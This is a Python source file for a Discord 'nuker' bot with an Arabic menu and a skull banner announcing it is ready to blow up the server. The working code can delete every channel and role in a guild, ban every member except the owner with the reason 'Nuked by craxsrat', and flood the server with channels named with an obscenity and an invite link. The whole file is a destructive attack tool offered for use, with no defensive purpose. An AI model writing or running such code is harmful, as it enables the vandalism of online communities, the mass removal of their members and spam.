import discord
from discord.ext import commands
import os
import asyncio
from colorama import init, Fore

init(autoreset=True)

token = input(Fore.GREEN + "🔑 token the bot: ")
prefix = "!"
intents = discord.Intents.all()

bot = commands.Bot(command_prefix=prefix, intents=intents)

ascii_skull = Fore.RED + r"""
               ______
          _.-'______'-._
       .-'.-'      '-.'-.
     .' .' ☠️ HACKER ☠️ '. '.
    / /   .--------.   \ \
   | |   / .------. \   | |
    \ \  | |      | |  / /
     '._\ \______//_.'
         '-.____.-'
"""

@bot.event
async def on_ready():
    os.system("cls" if os.name == "nt" else "clear")
    print(ascii_skull)
    print(Fore.GREEN + f"""
💀 {bot.user} جاهز لتفجير السيرفر 💀

{Fore.RED}[1] حذف جميع القنوات
{Fore.RED}[2] حذف جميع الرتب
{Fore.RED}[3] حظر جميع الأعضاء
{Fore.RED}[4] إنشاء قنوات سبام
{Fore.RED}[5] خروج
""")

    choice = input(Fore.CYAN + "📥 اختر رقم العملية: ")

    guild = bot.guilds[0]

    if choice == "1":
        print(Fore.YELLOW + "🧹 حذف جميع القنوات...")
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass

    elif choice == "2":
        print(Fore.YELLOW + "🧹 حذف جميع الرتب...")
        for role in guild.roles:
            try:
                if role.name != "@everyone":
                    await role.delete()
            except:
                pass

    elif choice == "3":
        print(Fore.YELLOW + "🔨 حظر جميع الأعضاء...")
        for member in guild.members:
            try:
                if member != guild.owner:
                    await member.ban(reason="Nuked by craxsrat ☠️")
            except:
                pass

    elif choice == "4":
        print(Fore.YELLOW + "💣 إنشاء قنوات سبام...")
        for i in range(20):
            try:
                await guild.create_text_channel(f"تم النيك https://discord.gg/4uJY6c7k-{i}")
            except:
                pass

    elif choice == "5":
        print(Fore.RED + "👋 تم الخروج من الأداة.")
        await bot.close()
        return

    print(Fore.GREEN + "\n✅ العملية تمت بنجاح!")
    await asyncio.sleep(5)
    await bot.close()

bot.run(token)
